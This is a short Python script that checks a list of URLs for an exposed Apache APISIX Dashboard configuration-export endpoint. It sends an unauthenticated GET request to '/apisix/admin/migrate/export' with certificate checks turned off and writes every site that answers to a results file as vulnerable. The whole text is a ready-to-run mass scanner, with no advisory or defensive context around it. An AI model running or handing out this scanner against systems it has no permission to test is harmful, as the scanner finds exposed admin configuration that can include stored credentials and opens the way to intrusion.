import requests
import sys

filename = sys.argv[1]
print(filename)
target = open(filename, 'r')
f = open('result.txt', 'w')
target_list = target.readlines()
for url in target_list:
    url = url.strip()
    payload = url + '/apisix/admin/migrate/export'
    try:
        rsp = requests.get(url=payload, verify=False, timeout=2)
    except:
        print('%s Error'%url)
        continue
    else:
        rsp_s = rsp.text
        if "Counsumers" in rsp_s:
            print("%s have vul" % url)
            f.writelines(url + 'have vul\n')
        else:
            print("%s no vul" % url)
f.close()
target.close()
